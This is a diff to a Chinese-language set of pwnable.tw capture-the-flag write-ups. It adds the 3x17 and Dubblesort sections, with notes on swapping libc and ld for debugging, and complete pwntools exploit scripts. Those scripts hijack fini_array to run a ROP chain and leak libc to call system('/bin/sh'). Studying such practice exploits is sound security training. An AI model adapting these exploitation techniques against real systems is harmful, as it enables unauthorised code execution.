@@ -46,7 +46,7 @@ Write 写入期待的字节数，遇到\n,\0时不会停止写入,但在受到�
 
 ```
 
-![](..\资源\pwnable.tw.Start.png)
+![](.\resource\pwnable.tw.Start.png)
 
 **思路**：
 
@@ -278,7 +278,7 @@ from pwn import *
 0x0805c34b : pop eax ; ret
 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
 0x08049a21 : int 0x80
-execve系统调用号11=0xb，execve(&'/bin/sh',0,0)
+32位execve系统调用号11=0xb，execve(&'/bin/sh',0,0)
 '''
 
 context(arch='i386',endian='little',os='linux',log_level='debug')
@@ -324,11 +324,149 @@ p.interactive()
 
 
 
+# 3x17
+
+主要参考：[和媳妇一起学Pwn 之 3x17 | Clang裁缝店 (xuanxuanblingbling.github.io)](https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/)
+
+补充要点：其中涉及的__libc_csu_init/fini在新版的glibc源码中已经被替换成了call_init和call_fini，并且fini只能在静态链接中使用了（上面参考的文章中看上去是没这个限制的）
+
+鉴于文章的确很好，就不再做过多分析，直接给出WriteUP:
+
+```python
+from pwn import *
+
+'''
+0x41e4af pop rax ; ret
+0x401696 pop rdi ; ret
+0x406c30 pop rsi ; ret
+0x446e35 pop rdx ; ret
+0x4022b4 syscall
+64位execve系统调用号59=0x3b，execve(&'/bin/sh',0,0)
+
+'''
+
+context(arch='amd64',endian='little',os='linux',log_level='debug')
+
+# p = process('./3x17')
+p = remote('chall.pwnable.tw', 10105)
+
+# 每次data只能最多是24字节
+def handle(addr,data):
+	p.recvuntil('addr:')
+	p.send(str(addr))
+	p.recvuntil('data:')
+	p.send(data)
+
+fini_array_pos = 0x4B40F0
+main_pos = 0x401B6D
+fini_pos = 0x402960
+
+handle(fini_array_pos,p64(fini_pos)+p64(main_pos))
+
+# 1.已经能劫持RIP
+# 2.虽然没有泄漏栈地址的方法，但可以考虑通过RIP间接劫持栈RSP到已知地址的可写区域，通过栈迁移方式达到想要的数据布局
+# 3.构造ROP链
+
+gadget_start_pos = 0x4b4100
+binsh_pos = gadget_start_pos + 9*8
+# 最后两个0主要是为了方便后面循环处理
+gadgets=[0x41e4af,0x3b,0x401696, binsh_pos,0x406c30,0,0x446e35,0,0x4022b4,u64('/bin/sh\x00'),0,0]
+
+for i in range(0,len(gadgets),3):
+	handle(gadget_start_pos+i*8,p64(gadgets[i])+p64(gadgets[i+1])+p64(gadgets[i+2]))
+# 触发ROP;当ret到一个正常函数的开始处（push rbp;mov rbp,rsp;），这种函数不会破坏栈底部方向的数据，并且在最后leave时栈就平衡了，这时会多出一个ret可以使用，利用这个可以推动ROP的调用
+leave_retn_pos = 0x401C4B
+handle(fini_array_pos,p64(leave_retn_pos))
+
+p.interactive()
+```
 
 
 
+# Dubblesort
 
+参考WriteUp：https://cloud.tencent.com/developer/article/1043903
 
+更换本地libc参考方法
 
+* 注意：ld链接器的版本要和glibc的版本要匹配，题目经常会提供glibc，但是自己需要去找到glibc对应版本的ld
 
+* patchelf方式（推荐）：
+
+  ```
+  ELF文件本身记录了解释器interpreter位置和库依赖（可以是名称（由interpreter依据名称在相关路径查找）也可以是绝对路径）
+  通过patch ELF文件，将ELF文件的interpreter和libc依赖路径进行修改，也可以达到相同的效果
+  1.patchelf --set-interpreter /lib/my-ld-linux.so.2 my-program
+  2.patchelf --replace-needed liboriginal.so.1 libreplacement.so.1（可以为绝对路径） my-program
+  可以参考链接：https://www.cnblogs.com/bhxdn/p/14541441.html
+  ```
+
+* pwndbg方式：
+
+  ```python
+  # 本质为命令行方式
+  export LD_PRELOAD=libc.so(替换成目标libc)
+  ld(替换成目标链接器) ./target
+  # 程序完成命令行操作
+  p=process(["ld","./target"],env={"LD_PRELOAD":"libc.so"})
+  #"ld"替换成你需要加载的目标ld，"./target"替换为你需要调试的二进制文件名，"libc.so"替换成你需要加载的目标libc，这样本地调试就可以通过目标libc进行
+  虽然可以运行起来程序，但是尝试调用shell时，会无法成功，出现ld相关的问题，不推荐
+  ```
+
+* 补充理解
+
+  ![](.\resource\pwnable.tw.dubblesort.png)
+
+  这里可以简单的看出来为什么需要改动ld
+
+* 关闭SIGALRM信号。在gdb输入: handle SIGALRM ignore ，原理是gdb可以拦截被调试进程的所有信号，当然包括SIGALRM，这样调试的时候程序就不会接收到该信号而退出
+
+* 关于栈上泄露地址的理解：有句成语叫做燕过留痕，存在过就可能有痕迹。就正常的程序而言，只要在栈上进行过libc的调用，那么栈上就存在过libc中的地址，如果刚好程序中有类似sub esp,20这种申请内存的方式，刚好涵盖了曾经存放过libc中的地址区域，且在被利用前这段内存没被写过，那么就有机会将这个地址泄露出来，进而进一步利用地址进行攻击。此外，做题的话，题目设计者更是有可能为了方便利用直接将题目做成容易泄露的形式。
+
+Writeup:
+
+```python
+from pwn import *
+
+context(arch='i386',endian='little',os='linux',log_level='debug')
+
+# p = process('./dubblesort')
+p = remote('chall.pwnable.tw', 10101)
+libc = ELF('./libc_32.so.6')
+
+p.sendafter('What your name :', 'k'*0x19)
+p.recvuntil('k'*0x19)
+
+leak_addr = u32(b'\x00'+p.recv(3))
+# print('lead_addr:',hex(leak_addr))
+libc_base_addr = leak_addr - 0x1b0000
+# print('system_addr_off:',hex(libc.symbols['system']))
+# print('binsh_addr_off',hex(next(libc.search(b'/bin/sh'))))
+system_addr = libc_base_addr + libc.symbols['system']
+binsh_addr = libc_base_addr + next(libc.search(b'/bin/sh'))
+# print('system_addr:',hex(system_addr))
+# print('binsh_addr',hex(binsh_addr))
+
+gadgets=[system_addr,binsh_addr,binsh_addr]
+
+p.recvuntil('what to sort :')
+p.sendline('35')
+
+def handle_write(data):
+	p.recvuntil('number : ')
+	p.sendline(data)
+
+for i in range(24):
+	handle_write(str(i))
+handle_write('+')
+# 由于栈中存在esp and操作，所以main其中的填充情况依据gdb调试查看stack中分布得到的结果
+# 这是取巧的一种方式，如果需要的话，多次盲尝试应该也能成功
+for i in range(7):
+	handle_write(str(gadgets[0]))
+handle_write(str(gadgets[0]))
+handle_write(str(gadgets[1]))
+handle_write(str(gadgets[2]))
+
+p.interactive()
+```
 
